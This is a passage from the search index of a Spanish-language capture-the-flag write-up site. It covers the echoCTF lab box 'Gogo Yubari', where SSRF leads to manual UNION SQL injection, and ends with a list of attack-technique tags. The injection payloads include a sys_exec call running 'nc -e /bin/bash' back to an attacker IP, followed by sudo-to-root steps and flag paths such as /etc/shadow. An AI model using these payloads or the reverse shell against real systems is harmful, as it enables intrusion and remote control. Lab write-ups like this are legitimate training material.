un <code>/</code> a la ruta que se consulta, por lo que se puede buscar que no se interprete a\u00f1adiendo un <code>#</code> al final como si se estuviera consultando un fragmento del sitio se\u00f1alado. Ejemplo, en <code>https://book.hacktricks.xyz/welcome/readme#pentesting-methodology</code>, se est\u00e1 consultando el recurso readme y dentro de \u00e9l se indica que se busca el fragmento <code>#pentesting-methodology</code> (v\u00e9ase W3C - Hash URI y Jeni Tennison - Hash URIs).</p> <p>Al visualizar que no se interpr\u00e9ta aparentemente, se busc\u00f3 usar url encoding en el <code>#</code> para ver si resultaba en un cambio <code>https://localhost.echocity-f.com/%23</code>, permitiendo as\u00ed visualizar la ruta interna y una bandera.</p> <p></p> <p>En este punto se intent\u00f3 consultar ciertas rutas est\u00e1ndares que suelen ocupar en la plataforma, tales como <code>ETSCTF</code> o <code>ETSCTF.html</code>, identificando que con la segunda despu\u00e9s de mandar la petici\u00f3n se creaba un elemento en la plataforma principal.</p> <p></p> <p>Y en el dashboard se puede visualizar un nuevo elemento.</p> <p></p> <p>En este punto se intent\u00f3 identificar una vulnerabilidad de tipo SSTI para los templates <code>.ejs</code> dado el output obtenido al enviar la petici\u00f3n a <code>ETSCTF.html</code> sin obtener \u00e9xito alguno. Por lo que se buscaron otras rutas disponibles en la plataforma, identificando:</p> <ul> <li><code>/add</code>.</li> <li><code>/edit</code>.</li> </ul> <p>En <code>/edit</code> al pasarle el id del elemento se pudieron visualizar sus valores. Ejemplo <code>https://localhost.echocity-f.com/edit?id=2</code>.</p> <p></p> <p>Despu\u00e9s al probar con <code>'</code> despu\u00e9s del id <code>https://localhost.echocity-f.com/edit?id=2'</code> se identific\u00f3 una excepci\u00f3n de SQL d\u00e1ndo paso a la siguiente fase de explotaci\u00f3n.</p> <p></p>","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#sqli","title":"SQLi","text":"<p>Al requerir de una validaci\u00f3n visual de inyecci\u00f3n dado el escenario se realizo manualmente todo el proceso de inyecci\u00f3n, buscando en primera instancia identificar el n\u00famero de columnas en la tabla, mediante:</p> <pre><code>id=2' UNION SELECT 1,2,3,4,5-- -\n</code></pre> <p>Iterando de 1 a N hasta no obtener errores en la respuesta. Posteriormente, se busc\u00f3 identificar cu\u00e1l de las columnas permite desplegar cadenas de car\u00e1cteres, identificando la segunda y tercera posici\u00f3n con (a\u00f1adiendo un ordenamiento para ver el contenido en los inputs disponibles):</p> <pre><code>id=2' UNION SELECT 1,'a','a',4,5 ORDER BY url ASC-- -\n</code></pre> <p></p> <p>Podiendo visualizar la informaci\u00f3n se busc\u00f3 identificar que usuario de base de datos estaba siendo usado para tratar de asumir con qu\u00e9 permisos se contaba. Usando:</p> <pre><code>id=2' UNION SELECT 1,user(),'a',4,5 ORDER BY url ASC-- -\n</code></pre> <p></p> <p>Al identificar al usuario <code>root</code> se busc\u00f3 ejecutar directamente una reverse shell con:</p> <pre><code>id=2' UNION SELECT 1,sys_exec('nc -e /bin/bash 10.10.0.50 1234'),'a',4,5-- -\n</code></pre> <p>Obteniendo as\u00ed, acceso a la m\u00e1quina.</p> <p></p>","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#post-explotacion","title":"Post Explotaci\u00f3n","text":"","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#escalacion-de-privilegios","title":"Escalaci\u00f3n de privilegios","text":"","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#mysql-root","title":"mysql \u2192 root","text":"<p>Al ejecutar <code>sudo -l</code> se puede visualizar que el usuario no tiene restricci\u00f3n alguna para ejecutar binarios con <code>sudo</code>, por lo que al ejecutar <code>sudo bash</code>, se obtiene acceso como <code>root</code>.</p> <p></p>","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#ubicacion-de-banderas","title":"Ubicaci\u00f3n de banderas","text":"<ol> <li>(other: 100 pts x2) <code>/app/frontend/forms.html</code> x2.</li> <li>(other: 100 pts) <code>/app/frontend/forms.go</code>.</li> <li>(other: 100 pts) <code>/app/frontend/ETSCTF.html</code>.</li> <li>(other: 400 pts) <code>/app/backend/views/etsctf.ejs</code>.</li> <li>(other: 500 pts) mysql event (Revisar eventos mysql).</li> <li>(other: 300 pts) scrapper databases (visto desde la plataforma interna o dentro de la base de datos).</li> <li>(system: 1300 pts) <code>/etc/passwd</code>.</li> <li>(system: 1300 pts) <code>/etc/shadow</code>.</li> <li>(env: 900 pts) <code>strings /proc/1/environ | grep ETSCTF_</code>.</li> <li>(root: 1500 pts) <code>/root</code></li> </ol>","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#notas-adicionales","title":"Notas adicionales","text":"","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#eventos-mysql","title":"Eventos <code>mysql</code>","text":"<p>Despu\u00e9s de realizar b\u00fasquedas recursivas en los directorios que ocupan la intrusi\u00f3n, encontr\u00e9 la bandera en el archivo que se interpreta como binario <code>/var/lib/mysql/event.MYD</code>. Al realizar el submit de la misma me encontr\u00e9 que el nombre hace alusi\u00f3n a los eventos de MySQL, al no conocerlos dec\u00eddi buscar informaci\u00f3n al repecto y la manera de consultarlos correctamente a trav\u00e9s del cliente <code>mysql</code>. Encontrando que estos pueden ser configurados a trav\u00e9s del <code>Event Scheduler</code> para ejecutar consultas definidas por el usuario para completar una tarea (algo similar a los cron jobs en linux). Permitiendo consultar su nombre y su contenido con:</p> <pre><code>MariaDB [(none)]&gt; use scrapper;\nuse scrapper;\nReading table information for completion of table and column names\nYou can turn off this feature to get a quicker startup with -A\n\nDatabase changed\nMariaDB [scrapper]&gt; show events\\G # Para consultar los eventos configurados.\nshow events\\G\n*************************** 1. row ***************************\n                  Db: scrapper\n                Name: ev_crawl_pending_queue\n             Definer: root@localhost\n           Time zone: SYSTEM\n                Type: RECURRING\n          Execute at: NULL\n      Interval value: 30\n      Interval field: SECOND\n              Starts: 2019-11-14 17:32:37\n                Ends: NULL\n              Status: ENABLED\n          Originator: 0\ncharacter_set_client: utf8mb4\ncollation_connection: utf8mb4_general_ci\n  Database Collation: utf8mb4_general_ci\n1 row in set (0.00 sec)\n\nMariaDB [scrapper]&gt; SHOW CREATE EVENT ev_crawl_pending_queue\\G # Para ver el la configuraci\u00f3n del evento seleccionado mediante su nombre.\nSHOW CREATE EVENT ev_crawl_pending_queue\\G\n*************************** 1. row ***************************\n               Event: ev_crawl_pending_queue\n            sql_mode: NO_AUTO_CREATE_USER,NO_ENGINE_SUBSTITUTION\n           time_zone: SYSTEM\n        Create Event: CREATE DEFINER=`root`@`localhost` EVENT `ev_crawl_pending_queue` ON SCHEDULE EVERY 30 SECOND STARTS '2019-11-14 17:32:37' ON COMPLETION NOT PRESERVE ENABLE COMMENT 'Check for commands that have no output ETSCTF_3f2652090448df5042' DO BEGIN\n  DECLARE pid,done INT;\n  DECLARE _pcur CURSOR FOR SELECT id FROM queue;\n  DECLARE CONTINUE HANDLER FOR NOT FOUND SET done = TRUE;\n  OPEN _pcur;\n  read_loop: LOOP\n    FETCH _pcur INTO pid;\n    IF done THEN\n      LEAVE read_loop;\n    END IF;\n  IF @debug IS NOT NULL THEN\n    SELECT pid;\n  END IF;\n  UPDATE crawlers SET output=sys_eval(CONCAT(command, ' \"', url,'\"')) WHERE id=pid;\n  DELETE FROM queue WHERE id=pid;\n  END LOOP;\n  CLOSE _pcur;\nEND\ncharacter_set_client: utf8mb4\ncollation_connection: utf8mb4_general_ci\n  Database Collation: utf8mb4_general_ci\n1 row in set (0.00 sec)\n</code></pre>","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"echoCTF/Boxes/5%20Experto/Gogo%20Yubari/#referencias","title":"Referencias","text":"<ul> <li>Definici\u00f3n Web Scrapping.</li> <li>W3C - Hash URI.</li> <li>Jeni Tennison - Hash URIs.</li> <li>MySQL Reference Manual - Using the Event Scheduler.</li> <li>MySQL Reference Manual - SHOW EVENTS Statement.</li> <li>MySQL Reference Manual - SHOW CREATE EVENT Statement.</li> </ul>","tags":["Server Side Request Forgery (SSRF)","SQL Injection"]},{"location":"tags/","title":"Etiquetas | Tags","text":"<p>Listado de etiquetas relevantes por tema y aparici\u00f3n:</p>"},{"location":"tags/#apktool","title":"APKTool","text":"<ul> <li>SeeTheSharpFlag</li> </ul>"},{"location":"tags/#abusing-ftp-iis-services","title":"Abusing FTP + IIS Services","text":"<ul> <li>Devel</li> </ul>"},{"location":"tags/#abusing-gpp-passwords","title":"Abusing GPP Passwords","text":"<ul> <li>Active</li> </ul>"},{"location":"tags/#abusing-genericall-privilege-resetting-a-users-password","title":"Abusing GenericAll privilege (Resetting a user's password)","text":"<ul> <li>Search</li> </ul>"},{"location":"tags/#abusing-oracle-database","title":"Abusing Oracle Database","text":"<ul> <li>Silo</li> </ul>"},{"location":"tags/#abusing-readgmsapassword-privilege","title":"Abusing ReadGMSAPassword privilege","text":"<ul> <li>Search</li> </ul>"},{"location":"tags/#abusing-seimpersonateprivilege","title":"Abusing SeImpersonatePrivilege","text":"<ul> <li>Jeeves</li> <li>Silo</li> </ul>"},{"location":"tags/#abusing-umbraco-admin-panel","title":"Abusing Umbraco Admin Panel","text":"<ul> <li>Remote</li> </ul>"},{"location":"tags/#abusing-windows-subsystem-for-linux-wsl","title":"Abusing Windows Subsystem for Linux (WSL)","text":"<ul> <li>SecNotes</li> </ul>"},{"location":"tags/#abusing-memcache-write-item-permission","title":"Abusing memcache write item permission","text":"<ul> <li>Smithers</li> </ul>"},{"location":"tags/#achat-0150-beta7-buffer-overflow-windows-7-32-bits","title":"Achat 0.150 beta7 - Buffer Overflow (Windows 7 32 bits)","text":"<ul> <li>Chatterbox</li> </ul>"},{"location":"tags/#advanced-bash-scripting-extra","title":"Advanced Bash Scripting (EXTRA)","text":"<ul> <li>Control</li> </ul>"},{"location":"tags/#alternate-data-streams-ads","title":"Alternate Data Streams (ADS)","text":"<ul> <li>Jeeves</li> </ul>"},{"location":"tags/#android","title":"Android","text":"<ul> <li>SeeTheSharpFlag</li> </ul>"},{"location":"tags/#applocker-bypass","title":"AppLocker Bypass","text":"<ul> <li>Control</li> </ul>"},{"location":"tags/#binary-analysis-ida","title":"Binary Analysis (IDA)","text":"<ul> <li>HTB Cyber Apocalypse CTF 2022</li> </ul>"},{"location":"tags/#bloodhound-enumeration","title":"Bloodhound Enumeration","text":"<ul> <li>Search</li> </ul>"},{"location":"tags/#breaking-keepass","title":"Breaking KeePass","text":"<ul> <li>Jeeves</li> </ul>"},{"location":"tags/#command-injection","title":"Command Injection","text":"<ul> <li>Smithers</li> </ul>"},{"location":"tags/#compresion-xalz","title":"Compresi\u00f3n XALZ","text":"<ul> <li>SeeTheSharpFlag</li> </ul>"},{"location":"tags/#conptyshell-fully-interactive-reverse-shell-for-windows","title":"ConPtyShell (Fully Interactive Reverse Shell for Windows)","text":"<ul> <li>Control</li> </ul>"},{"location":"tags/#cross-site-request-forgery-csrf-changing-a-users-password","title":"Cross-Site Request Forgery (CSRF) - Changing a user's password","text":"<ul> <li>SecNotes</li> </ul>"},{"location":"tags/#decompilacion-de-dlls","title":"Decompilaci\u00f3n de DLLs","text":"<ul> <li>SeeTheSharpFlag</li> </ul>"},{"location":"tags/#decrypting-gpp-passwords-gpp-decrypt","title":"Decrypting GPP Passwords - gpp-decrypt","text":"<ul> <li>Active</li> </ul>"},{"location":"tags/#gtfobins-zip","title":"GTFOBins (zip)","text":"<ul> <li>HTB Cyber Apocalypse CTF 2022</li> </ul>"},{"location":"tags/#gaining-access-to-windows-powershell-web-access","title":"Gaining access to Windows PowerShell Web Access","text":"<ul> <li>Search</li> </ul>"},{"location":"tags/#gaining-access-with-wmiexec","title":"Gaining access with wmiexec","text":"<ul> <li>Search</li> </ul>"},{"location":"tags/#generating-a-shellcode-based-on-our-needs-tips","title":"Generating a Shellcode based on our needs + TIPS","text":"<ul> <li>Chatterbox</li> </ul>"},{"location":"tags/#idor","title":"IDOR","text":"<ul> <li>HTB Cyber Apocalypse CTF 2022</li> </ul>"},{"location":"tags/#iis-exploitation-uploading-webshell","title":"IIS Exploitation (Uploading WebShell)","text":"<ul> <li>SecNotes</li> </ul>"},{"location":"tags/#ilspy","title":"ILSpy","text":"<ul> <li>SeeTheSharpFlag</li> </ul>"},{"location":"tags/#icacls-abuse-privilege-escalation","title":"Icacls Abuse (Privilege Escalation)","text":"<ul> <li>Chatterbox</li> </ul>"},{"location":"tags/#information-leakage","title":"Information Leakage","text":"<ul> <li>Remote</li> </ul>"},{"location":"tags/#information-leakage-privilege-escalation","title":"Information Leakage (Privilege Escalation)","text":"<ul> <li>SecNotes</li> </ul>"},{"location":"tags/#information-leakage-password-in-picture","title":"Information Leakage - Password in picture","text":"<ul> <li>Search</li> </ul>"},{"location":"tags/#jenkins-exploitation-groovy-script-console","title":"Jenkins Exploitation (Groovy Script Console)","text":"<ul> <li>Jeeves</li> </ul>"},{"location":"tags/#kerberoasting-attack-getuserspnspy","title":"Kerberoasting Attack (GetUserSPNs.py)","text":"<ul> <li>Search</li> </ul>"},{"location":"tags/#kerberoasting-attack-getuserspnspy-privilege-escalation","title":"Kerberoasting Attack (GetUserSPNs.py) [Privilege Escalation]","text":"<ul> <li>Active</li> </ul>"},{"location":"tags/#ldap-enumeration-ldapdomaindump","title":"Ldap Enumeration (ldapdomaindump)","text":"<ul> <li>Search</li> </ul>"},{"location":"tags/#memdump","title":"Memdump","text":"<ul> <li>Silo</li> </ul>"},{"location":"tags/#microsoft-windows-x86-afdsys-ms11-046-privilege-escalation","title":"Microsoft Windows (x86) \u2013 \u2018afd.sys\u2019 (MS11-046) [Privilege Escalation]","text":"<ul> <li>Devel</li> </ul>"},{"location":"tags/#microsoft-windows-event-logs-analysis-evtx","title":"Microsoft Windows Event Logs Analysis (evtx)+","text":"<ul> <li>HTB Cyber Apocalypse CTF 2022</li> </ul>"},{"location":"tags/#nfs-enumeration-showmount","title":"NFS Enumeration - Showmount","text":"<ul> <li>Remote</li> </ul>"},{"location":"tags/#ntuserdat-analysis","title":"NTUSER.dat Analysis","text":"<ul> <li>HTB Cyber Apocalypse CTF 2022</li> </ul>"},{"location":"tags/#obtaining-the-teamviewer-password-from-the-system-registers-aes128-cbc-privilege-escalation","title":"Obtaining the TeamViewer password from the system registers (AES128 - CBC) [Privilege Escalation]","text":"<ul> <li>Remote</li> </ul>"},{"location":"tags/#oracle-db-exploitation-attempting-a-remote-file-read","title":"Oracle DB Exploitation - Attempting a remote file read","text":"<ul> <li>Silo</li> </ul>"},{"location":"tags/#oracle-db-exploitation-attempting-a-remote-file-upload","title":"Oracle DB Exploitation - Attempting a remote file upload","text":"<ul> <li>Silo</li> </ul>"},{"location":"tags/#oracle-db-exploitation-attempting-execution-of-a-previously-uploaded-binary-file","title":"Oracle DB Exploitation - Attempting execution of a previously uploaded binary file","text":"<ul> <li>Silo</li> </ul>"},{"location":"tags/#oracle-db-exploitation-discovering-valid-credentials-passwordguesser","title":"Oracle DB Exploitation - Discovering valid credentials (passwordguesser)","text":"<ul> <li>Silo</li> </ul>"},{"location":"tags/#oracle-db-exploitation-identifying-valid-sids-sidguesser","title":"Oracle DB Exploitation - Identifying valid SIDs (sidguesser)","text":"<ul> <li>Silo</li> </ul>"},{"location":"tags/#oracle-database-attacking-tool-odat-installation","title":"Oracle Database Attacking Tool (ODAT) Installation","text":"<ul> <li>Silo</li> </ul>"},{"location":"tags/#passthehash-psexec","title":"PassTheHash (Psexec)","text":"<ul> <li>Jeeves</li> </ul>"},{"location":"tags/#playing-with-scriptblocks-and-pscredential-to-execute-commands-as-another-user","title":"Playing with ScriptBlocks and PSCredential to execute commands as another user","text":"<ul> <li>Control</li> </ul>"},{"location":"tags/#playing-with-pfx-certificates","title":"Playing with pfx certificates","text":"<ul> <li>Search</li> </ul>"},{"location":"tags/#powerup-enumeration-alternative-privilege-escalation","title":"PowerUp Enumeration (Alternative Privilege Escalation)","text":"<ul> <li>Chatterbox</li> </ul>"},{"location":"tags/#rce-md-to-pdf","title":"RCE (md-to-pdf)","text":"<ul> <li>HTB Cyber Apocalypse CTF 2022</li> </ul>"},{"location":"tags/#rpc-enumeration-rpcclient","title":"RPC Enumeration (rpcclient)","text":"<ul> <li>Search</li> </ul>"},{"location":"tags/#reflected-xss","title":"Reflected XSS","text":"<ul> <li>SecNotes</li> </ul>"},{"location":"tags/#smb-enumeration","title":"SMB Enumeration","text":"<ul> <li>Active</li> </ul>"},{"location":"tags/#smb-password-spray-attack-crackmapexec","title":"SMB Password Spray Attack (Crackmapexec)","text":"<ul> <li>Search</li> </ul>"},{"location":"tags/#sql-injection","title":"SQL Injection","text":"<ul> <li>SecNotes</li> <li>Gogo Yubari</li> </ul>"},{"location":"tags/#sql-injection-sqli-error-based","title":"SQL Injection [SQLI] - Error Based","text":"<ul> <li>Control</li> </ul>"},{"location":"tags/#sqli-to-rce-into-outfile-php-file-creation","title":"SQLI to RCE (Into Outfile - PHP File Creation)","text":"<ul> <li>Control</li> </ul>"},{"location":"tags/#ssh-authentication-bypass-libssh","title":"SSH Authentication Bypass (libssh)","text":"<ul> <li>Flanders</li> </ul>"},{"location":"tags/#server-side-request-forgery-ssrf","title":"Server Side Request Forgery (SSRF)","text":"<ul> <li>Gogo Yubari</li> </ul>"},{"location":"tags/#service-imagepath-hijacking-privilege-escalation","title":"Service ImagePath Hijacking (Privilege Escalation)","text":"<ul> <li>Control</li> </ul>"},{"location":"tags/#stored-xss","title":"Stored XSS","text":"<ul> <li>HTB Cyber Apocalypse CTF 2022</li> <li>SecNotes</li> </ul>"},{"location":"tags/#umbraco-cms-remote-code-execution-by-authenticated-administrators","title":"Umbraco CMS - Remote Code Execution by authenticated administrators","text":"<ul> <li>Remote</li> </ul>"},{"location":"tags/#unprotecting-password-protected-excel-remove-protection","title":"Unprotecting password-protected Excel (Remove Protection)","text":"<ul> <li>Search</li> </ul>"},{"location":"tags/#user-enumeration-wfuzz","title":"User Enumeration (Wfuzz)","text":"<ul> <li>SecNotes</li> </ul>"},{"location":"tags/#volatility","title":"Volatility","text":"<ul> <li>Silo</li> </ul>"},{"location":"tags/#web-enumeration","title":"Web Enumeration","text":"<ul> <li>Remote</li> </ul>"},{"location":"tags/#winpeas-enumeration","title":"WinPEAS Enumeration","text":"<ul> <li>Control</li> </ul>"},{"location":"tags/#writable-etcpasswd","title":"Writable /etc/passwd","text":"<ul> <li>Alister</li> </ul>"},{"location":"tags/#xamarin","title":"Xamarin","text":"<ul> <li>SeeTheSharpFlag</li> </ul>"}]}